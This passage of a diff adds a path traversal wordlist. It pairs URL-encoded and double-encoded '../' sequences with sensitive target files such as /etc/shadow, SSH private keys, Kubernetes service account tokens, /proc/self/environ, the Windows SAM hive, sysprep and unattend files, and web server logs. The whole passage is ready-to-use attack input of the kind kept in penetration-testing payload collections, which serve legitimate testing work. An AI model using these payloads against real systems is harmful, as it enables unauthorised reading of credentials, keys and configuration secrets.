+/%2e%2e%2f/var/log/vsftpd.log
+/%2e%2e%2f/var/log/sshd.log
+/%2e%2e%2f/var/log/mail
+/%252e%252e%252f/etc/issue
+/%252e%252e%252f/etc/passwd
+/%252e%252e%252f/etc/shadow
+/%252e%252e%252f/etc/group
+/%252e%252e%252f/etc/hosts
+/%252e%252e%252f/etc/motd
+/%252e%252e%252f/etc/mysql/my.cnf
+/%252e%252e%252f/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
+/%252e%252e%252f/proc/self/environ
+/%252e%252e%252f/proc/version
+/%252e%252e%252f/proc/cmdline
+/%252e%252e%252f/proc/sched_debug
+/%252e%252e%252f/proc/mounts
+/%252e%252e%252f/proc/net/arp
+/%252e%252e%252f/proc/net/route
+/%252e%252e%252f/proc/net/tcp
+/%252e%252e%252f/proc/net/udp
+/%252e%252e%252f/proc/self/cwd/index.php
+/%252e%252e%252f/proc/self/cwd/main.py
+/%252e%252e%252f/home/$USER/.bash_history
+/%252e%252e%252f/home/$USER/.ssh/id_rsa
+/%252e%252e%252f/run/secrets/kubernetes.io/serviceaccount/token
+/%252e%252e%252f/run/secrets/kubernetes.io/serviceaccount/namespace
+/%252e%252e%252f/run/secrets/kubernetes.io/serviceaccount/certificate
+/%252e%252e%252f/var/run/secrets/kubernetes.io/serviceaccount
+/%252e%252e%252f/var/lib/mlocate/mlocate.db
+/%252e%252e%252f/var/lib/mlocate.db
+/%252e%252e%252f/boot.ini
+/%252e%252e%252f/inetpub/logs/logfiles
+/%252e%252e%252f/inetpub/wwwroot/global.asa
+/%252e%252e%252f/inetpub/wwwroot/index.asp
+/%252e%252e%252f/inetpub/wwwroot/web.config
+/%252e%252e%252f/sysprep.inf
+/%252e%252e%252f/sysprep.xml
+/%252e%252e%252f/sysprep/sysprep.inf
+/%252e%252e%252f/sysprep/sysprep.xml
+/%252e%252e%252f/system32/inetsrv/metabase.xml
+/%252e%252e%252f/sysprep.inf
+/%252e%252e%252f/sysprep.xml
+/%252e%252e%252f/sysprep/sysprep.inf
+/%252e%252e%252f/sysprep/sysprep.xml
+/%252e%252e%252f/system volume information/wpsettings.dat
+/%252e%252e%252f/system32/inetsrv/metabase.xml
+/%252e%252e%252f/unattend.txt
+/%252e%252e%252f/unattend.xml
+/%252e%252e%252f/unattended.txt
+/%252e%252e%252f/unattended.xml
+/%252e%252e%252f/windows/repair/sam
+/%252e%252e%252f/windows/repair/system
+/%252e%252e%252f/var/log/apache/access.log
+/%252e%252e%252f/var/log/apache/error.log
+/%252e%252e%252f/var/log/httpd/error_log
+/%252e%252e%252f/usr/local/apache/log/error_log
+/%252e%252e%252f/usr/local/apache2/log/error_log
+/%252e%252e%252f/var/log/nginx/access.log
+/%252e%252e%252f/var/log/nginx/error.log
+/%252e%252e%252f/var/log/vsftpd.log
+/%252e%252e%252f/var/log/sshd.log
+/%252e%252e%252f/var/log/mail
+/etc/issue
+/etc/passwd
+/etc/shadow
+/etc/group
+/etc/hosts
+/etc/motd
+/etc/mysql/my.cnf
+/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
+/proc/self/environ
+/proc/version
+/proc/cmdline
+/proc/sched_debug
+/proc/mounts
+/proc/net/arp
+/proc/net/route
+/proc/net/tcp
+/proc/net/udp
+/proc/self/cwd/index.php
+/proc/self/cwd/main.py
+/home/$USER/.bash_history
+/home/$USER/.ssh/id_rsa
+/run/secrets/kubernetes.io/serviceaccount/token
+/run/secrets/kubernetes.io/serviceaccount/namespace
+/run/secrets/kubernetes.io/serviceaccount/certificate
+/var/run/secrets/kubernetes.io/serviceaccount
+/var/lib/mlocate/mlocate.db
+/var/lib/mlocate.db
+/boot.ini
+/inetpub/logs/logfiles
+/inetpub/wwwroot/global.asa
+/inetpub/wwwroot/index.asp
+/inetpub/wwwroot/web.config
+/sysprep.inf
+/sysprep.xml
+/sysprep/sysprep.inf
+/sysprep/sysprep.xml
+/system32/inetsrv/metabase.xml
+/sysprep.inf
+/sysprep.xml
+/sysprep/sysprep.inf
+/sysprep/sysprep.xml
+/system volume information/wpsettings.dat
+/system32/inetsrv/metabase.xml
+/unattend.txt
+/unattend.xml
+/unattended.txt
+/unattended.xml
+/windows/repair/sam
+/windows/repair/system
+/var/log/apache/access.log
+/var/log/apache/error.log
+/var/log/httpd/error_log
+/usr/local/apache/log/error_log
+/usr/local/apache2/log/error_log
+/var/log/nginx/access.log
+/var/log/nginx/error.log
+/var/log/vsftpd.log
+/var/log/sshd.log
+/var/log/mail
